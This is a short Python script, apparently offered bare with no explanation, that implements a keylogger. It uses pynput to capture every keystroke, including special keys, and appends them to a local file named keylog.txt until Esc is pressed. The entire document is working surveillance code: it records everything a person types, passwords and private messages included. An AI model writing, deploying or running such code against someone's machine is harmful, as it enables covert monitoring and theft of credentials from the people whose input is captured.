from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., enter, shift, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()